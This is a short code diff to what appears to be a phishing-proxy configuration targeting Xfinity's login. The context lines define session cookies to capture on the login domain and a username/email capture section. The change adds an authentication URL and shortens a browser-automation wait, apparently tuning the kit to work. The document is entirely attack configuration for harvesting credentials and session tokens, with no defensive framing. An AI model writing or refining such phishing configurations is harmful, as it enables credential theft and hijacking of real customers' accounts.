@@ -28,6 +28,9 @@ auth_tokens:
   - domain: '.login.xfinity.com'
     keys: ['JSESSIONID', 'session_token', 'suAKghhasg', 'gpv_Page', 's_sq']
 
+auth_urls:
+  - '/auth'
+
 credentials:
   # Username/Email capture
   username:
@@ -134,7 +137,7 @@ puppet:
           click: true
           required: true
           timeout: 15000
-          post_wait: 10000
+          post_wait: 1000
         # Wait for password field to ensure we are on the next page
         - selector: '#passwd'
           post_wait: 1000
